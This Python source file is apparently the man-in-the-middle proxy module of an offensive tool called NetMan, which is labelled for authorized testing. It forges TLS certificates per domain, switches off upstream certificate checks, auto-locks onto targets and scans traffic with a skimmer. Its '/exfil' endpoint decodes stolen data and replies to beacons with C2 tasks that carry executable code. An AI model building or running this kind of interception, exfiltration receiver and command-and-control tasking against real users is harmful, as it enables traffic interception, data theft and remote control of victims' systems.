#mitm_proxy
# NetMan - For authorized security testing only.
# See DISCLAIMER.md in the project root before use.
import socket
import threading
import ssl
import os
import datetime
import re
import base64
import urllib.parse
import json
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography import x509
from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
import __main__ as gui
import glob
import queue
import interceptor_engine
import http_utils
import skimmer_engine
import ai_engine
import agent_engine
import websocket_utils
from websocket_utils import get_websocket_interceptor
import logging

log_queue = queue.Queue()
exfil_queue = queue.Queue()
intercept_queue = queue.Queue()
is_running = False
cert_lock = threading.Lock()

_XFF_REFLECT_HEADERS = [
    'x-forwarded-for', 'x-real-ip', 'cf-connecting-ip',
    'x-client-ip', 'true-client-ip', 'x-original-forwarded-for',
]

CERT_MAX_AGE_DAYS = 7
DEFAULT_C2_TASK = {"code": "print('Beacon received, no task set.')"}
match_replace_rules = {"If-None-Match": "", "If-Modified-Since": ""}

# Initialize cert_cache as a global dictionary
cert_cache = {}

# Cached CA key and cert to avoid reading files on every new domain
_ca_key_cache = None
_ca_cert_cache = None
_task_json_cache = None
_task_json_mtime = None

def _get_ca_key_cert():
    global _ca_key_cache, _ca_cert_cache
    if _ca_key_cache is None:
        with open("jerry_ca.key", "rb") as f:
            _ca_key_cache = serialization.load_pem_private_key(f.read(), password=None)
        with open("jerry_ca.pem", "rb") as f:
            _ca_cert_cache = x509.load_pem_x509_certificate(f.read())
    return _ca_key_cache, _ca_cert_cache

class ProxyState:
    def __init__(self):
        self._lock = threading.Lock()
        self.active_scope = ""

    def get_scope(self):
        with self._lock:
            return self.active_scope

    def set_scope(self, scope):
        with self._lock:
            self.active_scope = scope

    def matches(self, target_host):
        current_scope = self.get_scope().lower()
        return current_scope == "" or current_scope in target_host.lower()


proxy_state = ProxyState()
active_scope = ""

def set_scope(scope):
    global active_scope
    active_scope = scope
    proxy_state.set_scope(scope)


def decode_exfil_payload(encoded_payload):
    try:
        decoded_payload = urllib.parse.unquote(encoded_payload)
        padding = '=' * (-len(decoded_payload) % 4)
        decoded_bytes = base64.urlsafe_b64decode(decoded_payload + padding)
        return decoded_bytes.decode('utf-8', errors='replace')
    except Exception as e:
        print(f"[!] Failed to decode exfil payload: {e}")
        return encoded_payload


def load_task_json():
    global _task_json_cache, _task_json_mtime
    if not os.path.exists("task.json"):
        return DEFAULT_C2_TASK
    try:
        mtime = os.path.getmtime("task.json")
        if _task_json_cache is not None and mtime == _task_json_mtime:
            return _task_json_cache
        with open("task.json", "r", encoding="utf-8") as f:
            loaded = json.load(f)
        _task_json_cache = loaded if isinstance(loaded, dict) else {"code": str(loaded)}
        _task_json_mtime = mtime
        return _task_json_cache
    except Exception as e:
        print(f"[!] Invalid task.json contents: {e}")
        return DEFAULT_C2_TASK


def build_c2_response(task_payload):
    payload = json.dumps(task_payload)
    payload_bytes = payload.encode("utf-8")
    return (
        b"HTTP/1.1 200 OK\r\n"
        + f"Content-Type: application/json\r\nContent-Length: {len(payload_bytes)}\r\nConnection: close\r\n\r\n".encode("utf-8")
        + payload_bytes
    )


def open_outbound_socket(host, port, timeout=5.0):
    last_error = None
    for family, socktype, proto, _, sockaddr in socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM):
        try:
            sock = socket.socket(family, socktype, proto)
            sock.settimeout(timeout)
            sock.connect(sockaddr)
            return sock
        except OSError as exc:
            last_error = exc
            try:
                sock.close()
            except Exception:
                pass
            continue
    raise OSError(f"Unable to reach {host}:{port} - {last_error}")


def clean_stale_certs(days=CERT_MAX_AGE_DAYS):
    print("[*] Sweeping for stale certificates...")
    cutoff = datetime.datetime.now() - datetime.timedelta(days=days)
    for cert_file in glob.glob("*.crt") + glob.glob("*.key") + glob.glob("*.chain.pem"):
        if cert_file in ["jerry_ca.pem", "jerry_ca.key"]:
            continue
        try:
            mtime = datetime.datetime.fromtimestamp(os.path.getmtime(cert_file))
            if mtime < cutoff:
                os.remove(cert_file)
                print(f"[+] Removed stale certificate {cert_file}")
        except OSError as e:
            print(f"[-] Could not remove {cert_file}: {e}")


def forge_cert(domain):
    if domain in cert_cache:
        return cert_cache[domain]

    cert_file = f"{domain}.crt"
    key_file = f"{domain}.key"
    chain_file = f"{domain}.chain.pem"

    # Reuse existing cert if key and chain both exist
    if os.path.exists(chain_file) and os.path.exists(key_file):
        logging.debug(f"[DEBUG] Reusing existing certificate for {domain}")
        cert_cache[domain] = (chain_file, key_file)
        return chain_file, key_file

    print(f"[*] Forging new certificate for {domain}...")
    ca_key, ca_cert = _get_ca_key_cert()
    assert ca_key is not None and ca_cert is not None, "CA key/cert failed to load"

    domain_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, domain)])
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(ca_cert.subject)
        .public_key(domain_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.utcnow() - datetime.timedelta(days=1))
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
        .add_extension(x509.SubjectAlternativeName([x509.DNSName(domain)]), critical=False)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True, content_commitment=False, key_encipherment=True,
                data_encipherment=False, key_agreement=False, key_cert_sign=False,
                crl_sign=False, encipher_only=False, decipher_only=False,
            ),
            critical=True,
        )
        .add_extension(
            x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]),
            critical=False,
        )
        .sign(ca_key, hashes.SHA256())  # type: ignore[arg-type]
    )

    with open(key_file, "wb") as f:
        f.write(domain_key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
    with open(cert_file, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))
    with open(chain_file, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))
        f.write(ca_cert.public_bytes(serialization.Encoding.PEM))

    logging.debug(f"[DEBUG] Certificate forged for {domain}: {chain_file}")
    cert_cache[domain] = (chain_file, key_file)
    return chain_file, key_file

# Reduce logging verbosity for WebSocket traffic
verbose_logging = False

def handle_websocket_upgrade(client_socket, websocket_info, is_tls=False):
    """Handle WebSocket upgrade request and establish proxy connection."""
    try:
        interceptor = get_websocket_interceptor()
        client_id = f"{websocket_info['host']}_{id(client_socket)}"

        # Extract target host and port
        target_host, target_port = websocket_info['host'], 443 if is_tls else 80
        if ':' in target_host:
            target_host, port_str = target_host.rsplit(':', 1)
            try:
                target_port = int(port_str)
            except ValueError:
                pass

        # Generate WebSocket accept key
        accept_key = interceptor.generate_websocket_accept(websocket_info['sec_websocket_key'])

        # Send WebSocket handshake response
        response = (
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Accept: {accept_key}\r\n"
            "Sec-WebSocket-Protocol: chat\r\n"
            "\r\n"
        )
        client_socket.sendall(response.encode())

        print(f"[+] WebSocket handshake completed for {client_id}")

        # Establish connection to target server
        try:
            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_sock.connect((target_host, target_port))

            if is_tls:
                # Add logging to capture all steps of the TLS handshake process
                logging.debug("[DEBUG] Starting TLS handshake.")
                tls_context = ssl.create_default_context()
                tls_context.check_hostname = False
                tls_context.verify_mode = ssl.CERT_NONE
                server_sock = tls_context.wrap_socket(server_sock, server_hostname=target_host)

            print(f"[+] Connected to WebSocket server: {target_host}:{target_port}")

            # Start bidirectional proxying
            def proxy_websocket_traffic():
                import select
                try:
                    # Set sockets to non-blocking
                    client_socket.setblocking(False)
                    server_sock.setblocking(False)

                    sockets = [client_socket, server_sock]

                    while True:
                        readable, _, _ = select.select(sockets, [], [], 1.0)

                        for sock in readable:
                            try:
                                data = sock.recv(8192)
                                if not data:
                                    print(f"[+] WebSocket connection closed for {client_id}")
                                    return

                                # Log WebSocket traffic if verbose logging is enabled
                                if verbose_logging:
                                    direction = "CLIENT -> SERVER" if sock == client_socket else "SERVER -> CLIENT"
                                    try:
                                        message = data.decode('utf-8', errors='ignore')
                                        interceptor.log_message(client_id, message, sock == client_socket)
                                    except:
                                        pass  # Binary data, skip logging for now

                                # Forward data
                                target_sock = server_sock if sock == client_socket else client_socket
                                target_sock.sendall(data)

                            except socket.error as e:
                                if e.errno != socket.EWOULDBLOCK:
                                    print(f"[-] WebSocket proxy error for {client_id}: {e}")
                                    return

                except Exception as e:
                    print(f"[-] WebSocket proxy error for {client_id}: {e}")
                finally:
                    try:
                        client_socket.close()
                        server_sock.close()
                    except:
                        pass

            # Run proxy in thread
            proxy_thread = threading.Thread(target=proxy_websocket_traffic)
            proxy_thread.daemon = True
            proxy_thread.start()

        except Exception as e:
            print(f"[-] Failed to connect to WebSocket server {target_host}:{target_port}: {e}")
            client_socket.close()

    except Exception as e:
        print(f"[-] WebSocket upgrade failed: {e}")
        client_socket.close()

def recv_http_message(sock, timeout=15.0, max_bytes=65536):
    """Receive an HTTP message with a timeout and maximum byte limit."""
    sock.settimeout(timeout)
    raw_data = b""
    while len(raw_data) < max_bytes:
        try:
            chunk = sock.recv(8192)
        except socket.timeout:
            break
        if not chunk:
            break
        raw_data += chunk
        if b"\r\n\r\n" in raw_data:
            headers, body = raw_data.split(b"\r\n\r\n", 1)
            cl_match = re.search(rb"content-length:[ \t]*(\d+)", headers.lower())
            if cl_match:
                expected_len = int(cl_match.group(1))
                if len(body) >= expected_len:
                    return headers + b"\r\n\r\n" + body[:expected_len]
            else:
                return raw_data
    return raw_data[:max_bytes]

def handle_client(client_socket):
    client_socket.settimeout(15.0)

    def recv_http_message(sock, timeout=15.0):
        sock.settimeout(timeout)
        raw_data = b""
        while True:
            try:
                chunk = sock.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            raw_data += chunk
            if b"\r\n\r\n" in raw_data:
                headers, body = raw_data.split(b"\r\n\r\n", 1)
                cl_match = re.search(rb"content-length:[ \t]*(\d+)", headers.lower())
                if cl_match:
                    expected_len = int(cl_match.group(1))
                    if len(body) >= expected_len:
                        return headers + b"\r\n\r\n" + body[:expected_len]
                else:
                    return raw_data
        return raw_data

    def split_host_port(host_value, default_port=80):
        host_value = host_value.strip()
        if host_value.startswith("[") and "]" in host_value:
            host = host_value[: host_value.index("]") + 1]
            port_part = host_value[host_value.index("]") + 1 :].lstrip(":")
            try:
                return host, int(port_part) if port_part else default_port
            except ValueError:
                return host, default_port
        if host_value.count(":") == 1:
            host, port_str = host_value.split(":", 1)
            try:
                return host, int(port_str)
            except ValueError:
                pass
        return host_value, default_port

    def parse_http_message(raw_bytes):
        if b"\r\n\r\n" not in raw_bytes:
            return None, [], b""
        header_part, body = raw_bytes.split(b"\r\n\r\n", 1)
        header_text = header_part.decode("utf-8", errors="ignore")
        header_lines = header_text.split("\r\n")
        return header_lines[0] if header_lines else "", header_lines[1:], body

    def normalize_request(request_line, header_lines, body_bytes):
        parts = request_line.split(" ")
        if len(parts) >= 3:
            method, target, version = parts[0], parts[1], parts[2]
            if "://" in target:
                parsed_target = urllib.parse.urlparse(target)
                path = parsed_target.path or "/"
                if parsed_target.query:
                    path += "?" + parsed_target.query
                request_line = f"{method} {path} {version}"

        cleaned = []
        for line in header_lines:
            if not line:
                continue
            lower = line.lower()
            if lower.startswith("if-none-match:") or lower.startswith("if-modified-since:"):
                continue
            if lower.startswith("connection:"):
                continue  # always drop; replaced below with Connection: close
            cleaned.append(line)

        cleaned.append("Connection: close")

        for header_name, header_value in match_replace_rules.items():
            if header_value == "":
                cleaned = [line for line in cleaned if not line.lower().startswith(header_name.lower() + ":")]
            else:
                updated = False
                for idx, line in enumerate(cleaned):
                    if line.lower().startswith(header_name.lower() + ":"):
                        cleaned[idx] = f"{header_name}: {header_value}"
                        updated = True
                        break
                if not updated:
                    cleaned.append(f"{header_name}: {header_value}")

        if body_bytes:
            content_length = str(len(body_bytes))
            found_length = False
            for idx, line in enumerate(cleaned):
                if line.lower().startswith("content-length:"):
                    cleaned[idx] = f"Content-Length: {content_length}"
                    found_length = True
                    break
            if not found_length:
                cleaned.append(f"Content-Length: {content_length}")

        return request_line, cleaned, body_bytes

    def rebuild_request(first_line, header_lines, body_bytes):
        header_payload = "\r\n".join([first_line] + header_lines) + "\r\n\r\n"
        return header_payload.encode("utf-8") + body_bytes

    def extract_target(first_line, header_lines, default_port=80):
        parts = first_line.split(" ")
        target = parts[1] if len(parts) > 1 else ""
        if "://" not in target and not target.startswith("["):
            target_for_parse = f"http://{target}"
        else:
            target_for_parse = target
        parsed = urllib.parse.urlparse(target_for_parse)
        host, port = split_host_port(parsed.netloc, default_port)
        if not host:
            for line in header_lines:
                if line.lower().startswith("host:"):
                    host_value = line.split(":", 1)[1].strip()
                    host, port = split_host_port(host_value, default_port)
                    break
        return host, port

    def maybe_lock_scope(request_text, target_host):
        if not target_host or "Accept: text/html" not in request_text:
            return
        # Don't overwrite a scope the user has already set
        if proxy_state.get_scope() != "":
            return
        noise_domains = ["mozilla", "firefox", "fastly-edge", "mozgcp", "googleapis",
                         "stripe", "youtube", "google", "doubleclick", "piwik",
                         "stackadapt", "hcaptcha", "g2.com"]
        if any(noise in target_host.lower() for noise in noise_domains):
            return
        if getattr(gui, 'active_scope', '') != target_host:
            setattr(gui, 'active_scope', target_host)
            proxy_state.set_scope(target_host)
            print(f"\n[+] TARGET ACQUIRED: Auto-Scope locked onto {target_host}\n")

    def process_exfil(first_line, client_sock):
        parsed = urllib.parse.urlparse(first_line.split(' ')[1])
        if parsed.path.startswith("/exfil"):
            params = urllib.parse.parse_qs(parsed.query)
            encoded_payload = params.get("c", [None])[0]
            if encoded_payload:
                decoded_data = decode_exfil_payload(encoded_payload)
                print(f"\n[$$$] Data Captured: {decoded_data}\n")
                exfil_queue.put(decoded_data)
                # Agent: summarise and risk-assess the captured exfil data
                _agent = getattr(gui, 'agent', None)
                if _agent is not None:
                    _agent.observe_exfil(decoded_data)
                client_sock.sendall(build_c2_response(load_task_json()))
                return True
        return False

    def handle_intercept(request_text, header_lines, body_bytes):
        is_noise = "socket.io" in request_text or "/assets/" in request_text or "favicon.ico" in request_text
        method = request_text.split(' ')[0]
        path = request_text.split(' ')[1] if len(request_text.split(' ')) > 1 else ""
        should_intercept = False
        if interceptor_engine.target_methods.get(method, False):
            if interceptor_engine.target_path == "" or interceptor_engine.target_path in path:
                should_intercept = True
        if interceptor_engine.is_enabled and not is_noise and should_intercept:
            clean_display = request_text.replace('\r\n', '\n')
            intercept_queue.put(clean_display)
            drop_flag, edited_request = interceptor_engine.wait_for_user()
            if drop_flag:
                return None, None, None, True
            edited_request = edited_request.replace('==========', '').strip()
            if "\n\n" in edited_request:
                header_block, body_text = edited_request.split("\n\n", 1)
            else:
                header_block = edited_request
                body_text = ""
            header_lines = header_block.split('\n')
            body_bytes = body_text.replace('\n', '\r\n').encode('utf-8', errors='ignore')
            return header_lines[0], header_lines[1:], body_bytes, False
        return None, None, None, False

    def maybe_log_traffic(target_host, raw_request):
        """Log traffic to file asynchronously to avoid blocking the request path."""
        decoded = raw_request.decode('utf-8', errors='ignore')
        log_file_path = os.path.join(os.getcwd(), "http_history.log")
        def _write():
            try:
                with open(log_file_path, "a", encoding="utf-8", buffering=8192) as log_file:
                    log_file.write(f"[TARGET: {target_host}]\n{decoded}\n==========\n")
            except Exception:
                pass
        threading.Thread(target=_write, daemon=True).start()

    def forward_request(client_sock, target_host, target_port, request_bytes, use_tls=False, xff_probe=None):
        connect_host = target_host.strip("[]")
        if connect_host == "localhost":
            connect_host = "127.0.0.1"
        try:
            outbound = open_outbound_socket(connect_host, target_port)
            if use_tls:
                # Add logging to capture all steps of the TLS handshake process
                logging.debug("[DEBUG] Starting TLS handshake.")
                tls_context = ssl.create_default_context()
                tls_context.check_hostname = False
                tls_context.verify_mode = ssl.CERT_NONE
                outbound = tls_context.wrap_socket(outbound, server_hostname=target_host.strip("[]"))
                logging.debug("[DEBUG] TLS handshake successful.")
            outbound.sendall(request_bytes)
            outbound.settimeout(10.0)
            header_buf = b""
            headers_done = False
            content_length = None
            body_received = 0
            while True:
                try:
                    chunk = outbound.recv(8192)
                except socket.timeout:
                    break
                if not chunk:
                    break
                client_sock.sendall(chunk)
                if not headers_done:
                    header_buf += chunk
                    if b"\r\n\r\n" in header_buf:
                        headers_done = True
                        hdr_part, rest = header_buf.split(b"\r\n\r\n", 1)
                        # XFF reflection detection
                        if xff_probe:
                            hdr_text = hdr_part.decode('utf-8', errors='ignore')
                            for line in hdr_text.splitlines():
                                if any(line.lower().startswith(h + ':') for h in _XFF_REFLECT_HEADERS) and xff_probe in line:
                                    alert = f"[XFF] {target_host} reflects X-Forwarded-For in: {line.strip()}"
                                    print(f"[!] {alert}")
                                    exfil_queue.put(alert)
                                    break
                        cl_match = re.search(rb"content-length:[ \t]*(\d+)", hdr_part.lower())
                        if cl_match:
                            content_length = int(cl_match.group(1))
                            body_received = len(rest)
                            if body_received >= content_length:
                                break
                elif content_length is not None:
                    body_received += len(chunk)
                    if body_received >= content_length:
                        break
            outbound.close()
        except Exception as e:
            print(f"[-] Forwarding failed to {target_host}:{target_port}: {e}")

    def handle_request(client_sock, first_line, header_lines, body_bytes, is_tls=False, connect_host=None, connect_port=None):
        target_host, target_port = extract_target(first_line, header_lines, default_port=443 if is_tls else 80)
        if connect_host:
            target_host = connect_host
        if connect_port:
            target_port = connect_port
        request_line = first_line
        request_line, normalized_headers, body_bytes = normalize_request(request_line, header_lines, body_bytes)
        request_bytes = rebuild_request(request_line, normalized_headers, body_bytes)
        request_text = request_bytes.decode('utf-8', errors='ignore')

        # Agent: non-blocking request classification and AI dispatch
        _agent = getattr(gui, 'agent', None)
        if _agent is not None:
            _agent.process_request(request_text, target_host)

        maybe_lock_scope(request_text, target_host)
        is_in_scope = proxy_state.matches(target_host)
        log_queue.put(request_text)
        if is_in_scope:
            skimmed_results = skimmer_engine.scan_payload(request_text)
            for alert in skimmed_results:
                exfil_queue.put(alert)
            _static_exts = ('.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.ico',
                            '.woff', '.woff2', '.svg', '.map', '.ttf', '.eot')
            _req_path = first_line.split(' ')[1].split('?')[0] if len(first_line.split(' ')) > 1 else ""
            _is_static = any(_req_path.endswith(ext) for ext in _static_exts)
            if not _is_static:
                ai_engine.event_queue.put({
                    "event": "skimmer_hit",
                    "target": target_host,
                    "payload": request_text,
                })

        if process_exfil(request_line, client_sock):
            return True

        edited = handle_intercept(request_text, normalized_headers, body_bytes)
        if edited[3]:
            return True
        if edited[0] is not None:
            request_line, normalized_headers, body_bytes, _ = edited
            request_bytes = rebuild_request(request_line, normalized_headers, body_bytes)

        forward_request(client_sock, target_host, target_port, request_bytes, use_tls=is_tls,
                        xff_probe=next((h.split(':', 1)[1].strip() for h in normalized_headers if h.lower().startswith('x-forwarded-for:')), None))
        return True

    raw_request = recv_http_message(client_socket)
    if not raw_request:
        client_socket.close()
        return

    first_line, header_lines, body_bytes = parse_http_message(raw_request)
    if not first_line:
        client_socket.close()
        return

    print(f"[*] Intercepted: {first_line}")
    valid_methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "CONNECT", "PATCH"]
    method = first_line.split(' ')[0].upper()
    if method not in valid_methods:
        client_socket.close()
        return

    # Check for WebSocket upgrade
    websocket_info = get_websocket_interceptor().intercept_websocket_upgrade(raw_request)
    if websocket_info:
        print(f"[+] WebSocket upgrade detected: {websocket_info['host']}{websocket_info['path']}")
        handle_websocket_upgrade(client_socket, websocket_info, is_tls=False)
        return

    if method == "CONNECT":
        host_port = first_line.split(' ')[1] if len(first_line.split(' ')) > 1 else ""
        tunnel_host, tunnel_port = split_host_port(host_port, 443)
        print(f"[*] SECURE TUNNEL REQUESTED: {tunnel_host}:{tunnel_port}")
        client_socket.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        try:
            with cert_lock:
                cert_file, key_file = forge_cert(tunnel_host)
            print(f"[+] Forged certificate for {tunnel_host}: {cert_file}")
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=cert_file, keyfile=key_file)
            context.set_alpn_protocols(["http/1.1"])
            secure_client = context.wrap_socket(client_socket, server_side=True)
            while True:
                raw_tls_request = recv_http_message(secure_client, timeout=15.0)
                if not raw_tls_request:
                    break
                tls_first_line, tls_header_lines, tls_body = parse_http_message(raw_tls_request)
                if not tls_first_line:
                    break
                    # Check for WebSocket upgrade in TLS
                websocket_info = get_websocket_interceptor().intercept_websocket_upgrade(raw_tls_request)
                if websocket_info:
                    print(f"[+] WebSocket upgrade detected (TLS): {websocket_info['host']}{websocket_info['path']}")
                    handle_websocket_upgrade(secure_client, websocket_info, is_tls=True)
                    break

                result = handle_request(
                    secure_client,
                    tls_first_line,
                    tls_header_lines,
                    tls_body,
                    is_tls=True,
                    connect_host=tunnel_host,
                    connect_port=tunnel_port,
                )
                # If request was dropped or connection should close, stop looping
                if not result:
                    break
            secure_client.close()
        except Exception as e:
            print(f"[-] SSL tunneling failed: {e}")
            client_socket.close()
        return

    handle_request(client_socket, first_line, header_lines, body_bytes)
def start_proxy(port=8080, global_listen=False):
    global is_running
    if not os.path.exists("jerry_ca.pem") or not os.path.exists("jerry_ca.key"):
        print("[-] Error: jerry_ca.pem and jerry_ca.key are required. Run build_ca.py first and install jerry_ca.pem as trusted CA.")
        return
    is_running = True
    clean_stale_certs()
    bind_ip = '0.0.0.0' if global_listen else '127.0.0.1'
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((bind_ip, port))
    server.listen(100)
    server.settimeout(1.0)
    print(f"[*] MITM Proxy listening on {bind_ip}:{port}")

    while is_running:
        try:
            client, addr = server.accept()
            proxy_thread = threading.Thread(target=handle_client, args=(client,))
            proxy_thread.start()
        except socket.timeout:
            continue
    server.close()

def stop_proxy():
    global is_running
    is_running = False

if __name__ == "__main__":
    start_proxy()
